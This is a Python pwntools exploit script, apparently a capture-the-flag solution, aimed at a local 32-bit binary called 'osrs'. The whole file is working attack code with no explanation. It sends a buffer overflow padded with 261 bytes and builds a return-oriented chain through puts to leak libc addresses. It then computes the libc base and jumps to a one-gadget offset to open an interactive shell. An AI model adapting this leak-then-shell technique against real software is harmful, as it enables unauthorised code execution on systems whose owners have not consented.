from pwn import *


e = ELF("./osrs")
libc = ELF("./libc.so.6")

p = process("./osrs")

#context.log_level="debug"
#gdb.attach(p, """break * get_tree+128""")

ret = 0x0804838a


p.recvuntil(":")

exploit = "Normal\x00"
exploit += "A"*261
exploit += p32(ret) + p32(e.plt["puts"]) + p32(0x08048546) + p32(e.sym["__libc_start_main"])

p.sendline(exploit)

p.recvline()
dat = p.recvline()


libc_leak = u32(dat[2:6])

print("leaking from", hex(e.sym["__libc_start_main"]))
print("libc leak", hex(libc_leak))

#print("dat", dat)
#p.interactive()

exploit = "Normal\x00"
exploit += "A"*261
exploit += p32(ret) + p32(e.plt["puts"]) + p32(0x08048546) + p32(libc_leak)

p.sendline(exploit)
p.recvline()
dat = p.recvline()

actual_libc_leak = u32(dat[:4])
print("actual libc leak", hex(actual_libc_leak))

libc.address = actual_libc_leak - 0x18d90

print("libc address", hex(libc.address))

exploit = "Normal\x00"
exploit += "A"*261


og = 0x6729f

exploit += p32(ret) + p32(og + libc.address)


p.sendline(exploit)





p.interactive()
